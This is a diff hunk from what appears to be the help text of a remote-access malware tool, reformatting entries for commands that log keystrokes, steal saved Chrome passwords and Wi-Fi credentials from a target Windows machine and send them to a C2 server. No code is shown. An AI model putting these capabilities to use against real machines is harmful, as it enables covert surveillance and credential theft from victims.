@@ -240,9 +240,11 @@ keylog_dump                   :    To print keystrokes
 
 keylog_off                    :    To close keylogger and self destruct the logged file
 
-spoof_passwd                  :    To spoof password as a file from trgt machine's (Windows only)	              browser (windows 10, Chrome browser Version 89.0                                   .4389.90 (Official Build) (64-bit)) and sents to                                    C2 Server.
+spoof_passwd                  :    To spoof password as a file from trgt machine's browser (windows 10, Chrome browser Version 89.0.4389.90 (Official Build) (64-bit)) and sents to C2 Server.
+(Windows only)
 
-spoof_wlan_creds              :    Spoofs wlan wifi profile creds and public/wan ip(Windows only)                     of the trgt windows machine
+spoof_wlan_creds              :    Spoofs wlan wifi profile creds and public/wan ip of the trgt windows machine
+(Windows only)
 
 spoof_wanip                   :    Spoofs public/wan ip of the trgt machine
 (Windows only)
